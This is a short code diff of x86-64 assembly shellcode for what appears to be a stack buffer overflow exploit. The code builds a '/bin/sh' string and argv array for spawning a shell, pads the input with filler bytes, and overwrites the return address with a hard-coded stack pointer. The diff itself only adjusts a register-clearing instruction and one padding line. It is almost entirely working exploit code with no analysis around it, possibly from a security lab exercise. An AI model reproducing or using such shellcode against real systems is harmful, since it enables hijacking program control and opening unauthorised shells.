@@ -17,7 +17,7 @@ main:
         xor     $0xffffdf18, %eax
         xor     %rax, %rcx              /* %rcx=0x00007fffffffdf50 (ptr to str  "/bin/sh") */
 
-        xor     %al, %al
+        xor     %rax, %rax
         mov     %al, 7(%rcx)             /* Add '\0' to "/bin/sh" */
         movq    %rcx, 8(%rcx)           /* Ptr to ['/bin/sh'] */
 
@@ -38,6 +38,6 @@ main:
         .ascii  "cccc"
         .ascii  "dddd"
         .ascii  "eeee"
-        .ascii  "fff"
+        //.ascii  "fff"
         // .ascii  "gggg"
         .quad   0x7fffffffded0           /* buffer ptr (the first instruction of payload), will overwrite real return address */
